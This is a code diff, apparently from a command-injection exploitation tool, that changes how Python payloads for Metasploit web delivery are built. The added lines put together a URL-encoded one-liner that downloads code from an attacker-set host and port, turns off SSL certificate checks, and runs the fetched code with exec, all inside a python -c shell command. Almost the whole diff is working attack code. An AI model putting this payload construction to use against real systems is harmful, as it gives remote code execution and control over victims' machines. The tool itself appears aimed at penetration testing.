@@ -446,7 +446,7 @@ Type '""" + Style.BRIGHT + """12""" + Style.RESET_ALL + """' to use the web deli
         with open (output, "r") as content_file:
           data = content_file.readlines()
           data = ''.join(data)
-          data = base64.b64encode(data.encode(settings.UNICODE_ENCODING)).decode()
+          #data = base64.b64encode(data.encode(settings.UNICODE_ENCODING)).decode()
 
         print(settings.SINGLE_WHITESPACE)
         # Remove the ouput file.
@@ -460,9 +460,9 @@ Type '""" + Style.BRIGHT + """12""" + Style.RESET_ALL + """' to use the web deli
 
         if settings.TARGET_OS == "win" and not settings.USER_DEFINED_PYTHON_DIR: 
           set_python_working_dir()
-          other_shell = settings.WIN_PYTHON_DIR + " -c exec('" + data + "'.decode('base64'))"
+          other_shell = settings.WIN_PYTHON_DIR + " -c " + data 
         else:
-          other_shell = settings.LINUX_PYTHON_INTERPRETER + " -c \"exec('" + data + "'.decode('base64'))\""
+          other_shell = settings.LINUX_PYTHON_INTERPRETER + " -c " + "\"" + data + "\""
         msf_launch_msg(output)
       except:
         print(settings.SINGLE_WHITESPACE)
@@ -632,13 +632,12 @@ Type '""" + Style.BRIGHT + """3""" + Style.RESET_ALL + """' to use Windows meter
                             "exploit\n\n")
 
           if web_delivery == '1':
-            data = "; r=_urllib.request.urlopen('http://" + str(settings.LHOST) + ":" + str(settings.SRVPORT) + settings.URIPATH + "'); exec(r.read());"
-            data = base64.b64encode(data.encode(settings.UNICODE_ENCODING)).decode()
+            data = "import sys%3bimport ssl%3bu%3d__import__('urllib'%2b{2%3a'',3%3a'.request'}[sys.version_info[0]],fromlist%3d('urlopen',))%3br%3du.urlopen('http://" + str(settings.LHOST) + ":" + str(settings.SRVPORT) + settings.URIPATH + "',context%3dssl._create_unverified_context())%3bexec(r.read())%3b"
             if settings.TARGET_OS == "win" and not settings.USER_DEFINED_PYTHON_DIR: 
               set_python_working_dir()
-              other_shell = settings.WIN_PYTHON_DIR + " -c exec('" + data + "'.decode('base64'))"
+              other_shell = settings.WIN_PYTHON_DIR + " -c " + data 
             else:
-              other_shell = settings.LINUX_PYTHON_INTERPRETER + " -c \"exec('" + data + "'.decode('base64'))\""
+              other_shell = settings.LINUX_PYTHON_INTERPRETER + " -c " + "\"" + data + "\""
             msf_launch_msg(output)
             break
           elif web_delivery == '2':
